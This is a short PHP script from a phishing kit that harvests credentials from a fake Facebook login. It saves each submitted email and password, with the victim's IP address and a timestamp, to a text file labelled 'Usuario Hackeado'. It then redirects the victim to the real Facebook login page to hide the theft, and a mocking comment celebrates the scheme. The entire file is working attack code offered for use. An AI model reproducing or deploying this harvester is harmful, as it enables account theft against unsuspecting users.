<?php
//jaja todo esto es genial
$usuario = $_POST['email']; 
$password = $_POST['pass'];
$ip = $_SERVER['REMOTE_ADDR']; 
$fecha = date("Y-m-d;h:i:s");


if( (empty($usuario)) or (empty($password)) ){
     header('location: index.html');
}else{

     //Guardara en un archivo de texto con las credenciales
$file = fopen('Contrasenas.txt','a+'); 
fwrite($file, "\r\nUsuario Hackeado: ".$usuario."\r\nContraseña : ".$password."\r\nIP del usuario: ".$ip."\r\nFecha del Hack: ".$fecha."\r\n<--------XX-------->\r\n");
fclose($file);

header("Location: https://www.facebook.com/login.php?login_attempt=1");
}
?>


